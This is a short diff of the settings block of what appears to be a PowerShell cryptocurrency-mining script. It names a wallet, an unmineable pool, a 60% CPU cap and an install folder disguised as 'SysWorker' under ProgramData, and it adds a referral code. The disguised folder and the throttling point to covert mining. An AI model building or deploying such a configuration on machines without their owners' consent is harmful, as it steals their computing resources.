@@ -1,6 +1,7 @@
 # === НАСТРОЙКИ ===
 $Coin = "USDT"
 $Wallet = "0xbD4a36e73BDa8B0f50689d60528c698FA05b6005"
+$RefCode = "rbi3-l12f"
 $Pool = "rx.unmineable.com:3333"
 $MaxCpuUsage = 60                      # % CPU
 $InstallDir = "C:\ProgramData\SysWorker"
